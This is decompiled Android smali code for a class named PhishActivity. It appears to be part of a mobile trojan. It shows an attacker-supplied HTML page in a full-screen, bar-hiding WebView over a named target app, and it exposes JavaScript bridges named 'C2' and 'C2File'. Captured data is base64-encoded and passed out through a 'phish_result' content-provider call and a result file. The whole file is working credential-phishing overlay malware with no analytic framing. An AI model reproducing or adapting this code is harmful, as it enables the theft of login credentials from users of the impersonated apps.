.class public Lcom/servers/ozzbzk/PhishActivity;
.super Landroid/app/Activity;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/servers/ozzbzk/PhishActivity$C2Bridge;
    }
.end annotation


# static fields
.field private static final SOFT_DISMISS_MS:J = 0x12cL

.field private static final TAG:Ljava/lang/String; = "PhishAct"


# instance fields
.field private bridgeUri:Landroid/net/Uri;

.field private final mainHandler:Landroid/os/Handler;

.field private pendingDismiss:Ljava/lang/Runnable;

.field private volatile resultDelivered:Z

.field private resultPath:Ljava/lang/String;

.field private targetPkg:Ljava/lang/String;

.field private webView:Landroid/webkit/WebView;


# direct methods
.method static bridge synthetic -$$Nest$fgetwebView(Lcom/servers/ozzbzk/PhishActivity;)Landroid/webkit/WebView;
    .locals 0

    iget-object p0, p0, Lcom/servers/ozzbzk/PhishActivity;->webView:Landroid/webkit/WebView;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$mcancelPendingDismiss(Lcom/servers/ozzbzk/PhishActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/servers/ozzbzk/PhishActivity;->cancelPendingDismiss()V

    return-void
.end method

.method static bridge synthetic -$$Nest$mdeliverResult(Lcom/servers/ozzbzk/PhishActivity;Ljava/lang/String;Z)V
    .locals 0

    invoke-direct {p0, p1, p2}, Lcom/servers/ozzbzk/PhishActivity;->deliverResult(Ljava/lang/String;Z)V

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    .line 32
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 43
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, Lcom/servers/ozzbzk/PhishActivity;->mainHandler:Landroid/os/Handler;

    return-void
.end method

.method private cancelPendingDismiss()V
    .locals 2

    .line 223
    iget-object v0, p0, Lcom/servers/ozzbzk/PhishActivity;->pendingDismiss:Ljava/lang/Runnable;

    if-eqz v0, :cond_0

    .line 224
    iget-object v1, p0, Lcom/servers/ozzbzk/PhishActivity;->mainHandler:Landroid/os/Handler;

    invoke-virtual {v1, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    const/4 v0, 0x0

    .line 225
    iput-object v0, p0, Lcom/servers/ozzbzk/PhishActivity;->pendingDismiss:Ljava/lang/Runnable;

    :cond_0
    return-void
.end method

.method private deliverResult(Ljava/lang/String;Z)V
    .locals 3

    .line 230
    iget-boolean v0, p0, Lcom/servers/ozzbzk/PhishActivity;->resultDelivered:Z

    if-eqz v0, :cond_0

    return-void

    :cond_0
    const/4 v0, 0x1

    .line 233
    iput-boolean v0, p0, Lcom/servers/ozzbzk/PhishActivity;->resultDelivered:Z

    .line 234
    invoke-direct {p0}, Lcom/servers/ozzbzk/PhishActivity;->cancelPendingDismiss()V

    .line 235
    invoke-direct {p0, p1, p2}, Lcom/servers/ozzbzk/PhishActivity;->writeResultFile(Ljava/lang/String;Z)V

    .line 237
    :try_start_0
    new-instance v0, Landroid/os/Bundle;

    invoke-direct {v0}, Landroid/os/Bundle;-><init>()V

    .line 238
    const-string v1, "target_pkg"

    iget-object v2, p0, Lcom/servers/ozzbzk/PhishActivity;->targetPkg:Ljava/lang/String;

    if-eqz v2, :cond_1

    goto :goto_0

    :cond_1
    const-string v2, ""

    :goto_0
    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 239
    const-string v1, "data_b64"

    const-string v2, "UTF-8"

    .line 240
    invoke-virtual {p1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p1

    const/4 v2, 0x2

    invoke-static {p1, v2}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p1

    .line 239
    invoke-virtual {v0, v1, p1}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 241
    const-string p1, "dismissed"

    invoke-virtual {v0, p1, p2}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    .line 242
    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object p1

    invoke-direct {p0}, Lcom/servers/ozzbzk/PhishActivity;->getBridgeUri()Landroid/net/Uri;

    move-result-object p2

    const-string v1, "phish_result"

    const/4 v2, 0x0

    invoke-virtual {p1, p2, v1, v2, v0}, Landroid/content/ContentResolver;->call(Landroid/net/Uri;Ljava/lang/String;Ljava/lang/String;Landroid/os/Bundle;)Landroid/os/Bundle;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method private getBridgeUri()Landroid/net/Uri;
    .locals 3

    .line 47
    iget-object v0, p0, Lcom/servers/ozzbzk/PhishActivity;->bridgeUri:Landroid/net/Uri;

    if-nez v0, :cond_0

    .line 48
    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->getPackageName()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "content://"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, ".bridge"

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    iput-object v0, p0, Lcom/servers/ozzbzk/PhishActivity;->bridgeUri:Landroid/net/Uri;

    .line 50
    :cond_0
    iget-object v0, p0, Lcom/servers/ozzbzk/PhishActivity;->bridgeUri:Landroid/net/Uri;

    return-object v0
.end method

.method private handleFinishIntent(Landroid/content/Intent;)Z
    .locals 1

    if-eqz p1, :cond_0

    .line 144
    const-string v0, "action"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "finish"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    .line 145
    invoke-direct {p0}, Lcom/servers/ozzbzk/PhishActivity;->cancelPendingDismiss()V

    .line 146
    const-string p1, "{\"dismissed\":true}"

    const/4 v0, 0x1

    invoke-direct {p0, p1, v0}, Lcom/servers/ozzbzk/PhishActivity;->deliverResult(Ljava/lang/String;Z)V

    .line 147
    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->finish()V

    return v0

    :cond_0
    const/4 p1, 0x0

    return p1
.end method

.method private scheduleSoftDismiss()V
    .locals 4

    .line 203
    iget-boolean v0, p0, Lcom/servers/ozzbzk/PhishActivity;->resultDelivered:Z

    if-nez v0, :cond_2

    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->isFinishing()Z

    move-result v0

    if-eqz v0, :cond_0

    goto :goto_0

    .line 206
    :cond_0
    iget-object v0, p0, Lcom/servers/ozzbzk/PhishActivity;->pendingDismiss:Ljava/lang/Runnable;

    if-eqz v0, :cond_1

    return-void

    .line 209
    :cond_1
    new-instance v0, Lcom/servers/ozzbzk/PhishActivity$$ExternalSyntheticLambda0;

    invoke-direct {v0, p0}, Lcom/servers/ozzbzk/PhishActivity$$ExternalSyntheticLambda0;-><init>(Lcom/servers/ozzbzk/PhishActivity;)V

    iput-object v0, p0, Lcom/servers/ozzbzk/PhishActivity;->pendingDismiss:Ljava/lang/Runnable;

    .line 219
    iget-object v1, p0, Lcom/servers/ozzbzk/PhishActivity;->mainHandler:Landroid/os/Handler;

    const-wide/16 v2, 0x12c

    invoke-virtual {v1, v0, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_2
    :goto_0
    return-void
.end method

.method private writeResultFile(Ljava/lang/String;Z)V
    .locals 4

    .line 249
    iget-object v0, p0, Lcom/servers/ozzbzk/PhishActivity;->resultPath:Ljava/lang/String;

    if-eqz v0, :cond_3

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    goto :goto_0

    .line 253
    :cond_0
    :try_start_0
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lcom/servers/ozzbzk/PhishActivity;->resultPath:Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 254
    new-instance v1, Ljava/io/File;

    iget-object v2, p0, Lcom/servers/ozzbzk/PhishActivity;->resultPath:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ".tmp"

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 255
    invoke-virtual {v0}, Ljava/io/File;->getParentFile()Ljava/io/File;

    move-result-object v2

    if-eqz v2, :cond_1

    .line 256
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v3

    if-nez v3, :cond_1

    .line 257
    invoke-virtual {v2}, Ljava/io/File;->mkdirs()Z

    :cond_1
    if-eqz p2, :cond_2

    .line 259
    const-string p1, "{\"dismissed\":true}"

    .line 260
    :cond_2
    new-instance p2, Ljava/io/FileOutputStream;

    invoke-direct {p2, v1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 261
    const-string v2, "UTF-8"

    invoke-virtual {p1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/io/FileOutputStream;->write([B)V

    .line 262
    invoke-virtual {p2}, Ljava/io/FileOutputStream;->getFD()Ljava/io/FileDescriptor;

    move-result-object p1

    invoke-virtual {p1}, Ljava/io/FileDescriptor;->sync()V

    .line 263
    invoke-virtual {p2}, Ljava/io/FileOutputStream;->close()V

    .line 265
    invoke-virtual {v1, v0}, Ljava/io/File;->renameTo(Ljava/io/File;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 267
    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    new-instance p2, Ljava/lang/StringBuilder;

    const-string v0, "writeResult: "

    invoke-direct {p2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "PhishAct"

    invoke-static {p2, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_3
    :goto_0
    return-void
.end method


# virtual methods
.method synthetic lambda$scheduleSoftDismiss$0$com-servers-ozzbzk-PhishActivity()V
    .locals 2

    .line 0
    const/4 v0, 0x0

    .line 210
    iput-object v0, p0, Lcom/servers/ozzbzk/PhishActivity;->pendingDismiss:Ljava/lang/Runnable;

    .line 211
    iget-boolean v0, p0, Lcom/servers/ozzbzk/PhishActivity;->resultDelivered:Z

    if-nez v0, :cond_1

    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->isFinishing()Z

    move-result v0

    if-eqz v0, :cond_0

    goto :goto_0

    .line 214
    :cond_0
    const-string v0, "{\"dismissed\":true}"

    const/4 v1, 0x1

    invoke-direct {p0, v0, v1}, Lcom/servers/ozzbzk/PhishActivity;->deliverResult(Ljava/lang/String;Z)V

    .line 215
    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_1

    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->isDestroyed()Z

    move-result v0

    if-nez v0, :cond_1

    .line 216
    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->finish()V

    :cond_1
    :goto_0
    return-void
.end method

.method public onBackPressed()V
    .locals 2

    .line 155
    invoke-direct {p0}, Lcom/servers/ozzbzk/PhishActivity;->cancelPendingDismiss()V

    .line 156
    const-string v0, "{\"dismissed\":true}"

    const/4 v1, 0x1

    invoke-direct {p0, v0, v1}, Lcom/servers/ozzbzk/PhishActivity;->deliverResult(Ljava/lang/String;Z)V

    .line 157
    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->finish()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 5

    .line 55
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 57
    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->getIntent()Landroid/content/Intent;

    move-result-object p1

    invoke-direct {p0, p1}, Lcom/servers/ozzbzk/PhishActivity;->handleFinishIntent(Landroid/content/Intent;)Z

    move-result p1

    if-eqz p1, :cond_0

    return-void

    .line 61
    :cond_0
    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->getIntent()Landroid/content/Intent;

    move-result-object p1

    const-string v0, "html_path"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    .line 62
    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v1, "html_base64"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 63
    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->getIntent()Landroid/content/Intent;

    move-result-object v1

    const-string v2, "target_pkg"

    invoke-virtual {v1, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/servers/ozzbzk/PhishActivity;->targetPkg:Ljava/lang/String;

    .line 64
    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->getIntent()Landroid/content/Intent;

    move-result-object v1

    const-string v2, "result_path"

    invoke-virtual {v1, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/servers/ozzbzk/PhishActivity;->resultPath:Ljava/lang/String;

    const/4 v1, 0x0

    if-eqz v0, :cond_1

    .line 67
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_1

    const/4 p1, 0x2

    .line 69
    :try_start_0
    invoke-static {v0, p1}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object p1

    .line 70
    new-instance v0, Ljava/io/File;

    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->getCacheDir()Ljava/io/File;

    move-result-object v2

    const-string v3, "phish_page.html"

    invoke-direct {v0, v2, v3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 71
    new-instance v2, Ljava/io/FileOutputStream;

    invoke-direct {v2, v0}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 72
    invoke-virtual {v2, p1}, Ljava/io/FileOutputStream;->write([B)V

    .line 73
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->close()V

    .line 74
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 76
    :catch_0
    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->finish()V

    return-void

    :cond_1
    if-eqz p1, :cond_2

    .line 79
    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_2

    goto :goto_0

    :cond_2
    move-object p1, v1

    :goto_0
    if-nez p1, :cond_3

    .line 84
    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->finish()V

    return-void

    :cond_3
    const/4 v0, 0x1

    .line 88
    invoke-virtual {p0, v0}, Lcom/servers/ozzbzk/PhishActivity;->requestWindowFeature(I)Z

    .line 89
    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->getWindow()Landroid/view/Window;

    move-result-object v2

    const/16 v3, 0x680

    .line 90
    invoke-virtual {v2, v3}, Landroid/view/Window;->addFlags(I)V

    .line 94
    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x1c

    if-lt v3, v4, :cond_4

    .line 95
    invoke-virtual {v2}, Landroid/view/Window;->getAttributes()Landroid/view/WindowManager$LayoutParams;

    move-result-object v3

    iput v0, v3, Landroid/view/WindowManager$LayoutParams;->layoutInDisplayCutoutMode:I

    :cond_4
    const/4 v3, 0x0

    .line 100
    invoke-virtual {v2, v3}, Landroid/view/Window;->setStatusBarColor(I)V

    .line 101
    invoke-virtual {v2, v3}, Landroid/view/Window;->setNavigationBarColor(I)V

    .line 104
    new-instance v2, Landroid/webkit/WebView;

    invoke-direct {v2, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    iput-object v2, p0, Lcom/servers/ozzbzk/PhishActivity;->webView:Landroid/webkit/WebView;

    const/high16 v4, -0x1000000

    .line 105
    invoke-virtual {v2, v4}, Landroid/webkit/WebView;->setBackgroundColor(I)V

    .line 106
    iget-object v2, p0, Lcom/servers/ozzbzk/PhishActivity;->webView:Landroid/webkit/WebView;

    const/16 v4, 0x1706

    invoke-virtual {v2, v4}, Landroid/webkit/WebView;->setSystemUiVisibility(I)V

    .line 114
    iget-object v2, p0, Lcom/servers/ozzbzk/PhishActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    .line 115
    invoke-virtual {v2, v0}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 116
    invoke-virtual {v2, v0}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    .line 117
    invoke-virtual {v2, v0}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V

    .line 118
    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setAllowFileAccessFromFileURLs(Z)V

    .line 120
    iget-object v0, p0, Lcom/servers/ozzbzk/PhishActivity;->webView:Landroid/webkit/WebView;

    new-instance v2, Lcom/servers/ozzbzk/PhishActivity$C2Bridge;

    invoke-direct {v2, p0, v1}, Lcom/servers/ozzbzk/PhishActivity$C2Bridge;-><init>(Lcom/servers/ozzbzk/PhishActivity;Lcom/servers/ozzbzk/PhishActivity$C2Bridge-IA;)V

    const-string v3, "C2"

    invoke-virtual {v0, v2, v3}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    .line 121
    iget-object v0, p0, Lcom/servers/ozzbzk/PhishActivity;->webView:Landroid/webkit/WebView;

    new-instance v2, Lcom/servers/ozzbzk/PhishActivity$C2Bridge;

    invoke-direct {v2, p0, v1}, Lcom/servers/ozzbzk/PhishActivity$C2Bridge;-><init>(Lcom/servers/ozzbzk/PhishActivity;Lcom/servers/ozzbzk/PhishActivity$C2Bridge-IA;)V

    const-string v1, "C2File"

    invoke-virtual {v0, v2, v1}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    .line 122
    iget-object v0, p0, Lcom/servers/ozzbzk/PhishActivity;->webView:Landroid/webkit/WebView;

    new-instance v1, Landroid/webkit/WebViewClient;

    invoke-direct {v1}, Landroid/webkit/WebViewClient;-><init>()V

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 124
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 125
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result p1

    if-eqz p1, :cond_5

    .line 126
    iget-object p1, p0, Lcom/servers/ozzbzk/PhishActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "file://"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 132
    iget-object p1, p0, Lcom/servers/ozzbzk/PhishActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {p0, p1}, Lcom/servers/ozzbzk/PhishActivity;->setContentView(Landroid/view/View;)V

    return-void

    .line 128
    :cond_5
    invoke-virtual {p0}, Lcom/servers/ozzbzk/PhishActivity;->finish()V

    return-void
.end method

.method protected onDestroy()V
    .locals 1

    .line 194
    invoke-direct {p0}, Lcom/servers/ozzbzk/PhishActivity;->cancelPendingDismiss()V

    .line 195
    iget-object v0, p0, Lcom/servers/ozzbzk/PhishActivity;->webView:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    .line 196
    invoke-virtual {v0}, Landroid/webkit/WebView;->destroy()V

    const/4 v0, 0x0

    .line 197
    iput-object v0, p0, Lcom/servers/ozzbzk/PhishActivity;->webView:Landroid/webkit/WebView;

    .line 199
    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method protected onNewIntent(Landroid/content/Intent;)V
    .locals 1

    .line 137
    invoke-super {p0, p1}, Landroid/app/Activity;->onNewIntent(Landroid/content/Intent;)V

    const/4 v0, 0x0

    .line 138
    iput-boolean v0, p0, Lcom/servers/ozzbzk/PhishActivity;->resultDelivered:Z

    .line 139
    invoke-direct {p0}, Lcom/servers/ozzbzk/PhishActivity;->cancelPendingDismiss()V

    .line 140
    invoke-direct {p0, p1}, Lcom/servers/ozzbzk/PhishActivity;->handleFinishIntent(Landroid/content/Intent;)Z

    return-void
.end method

.method protected onResume()V
    .locals 0

    .line 176
    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    .line 177
    invoke-direct {p0}, Lcom/servers/ozzbzk/PhishActivity;->cancelPendingDismiss()V

    return-void
.end method

.method protected onStop()V
    .locals 0

    .line 188
    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    .line 189
    invoke-direct {p0}, Lcom/servers/ozzbzk/PhishActivity;->scheduleSoftDismiss()V

    return-void
.end method

.method protected onUserLeaveHint()V
    .locals 0

    .line 182
    invoke-super {p0}, Landroid/app/Activity;->onUserLeaveHint()V

    .line 183
    invoke-direct {p0}, Lcom/servers/ozzbzk/PhishActivity;->scheduleSoftDismiss()V

    return-void
.end method

.method public onWindowFocusChanged(Z)V
    .locals 1

    .line 162
    invoke-super {p0, p1}, Landroid/app/Activity;->onWindowFocusChanged(Z)V

    if-eqz p1, :cond_0

    .line 163
    iget-object p1, p0, Lcom/servers/ozzbzk/PhishActivity;->webView:Landroid/webkit/WebView;

    if-eqz p1, :cond_0

    const/16 v0, 0x1706

    .line 164
    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->setSystemUiVisibility(I)V

    :cond_0
    return-void
.end method
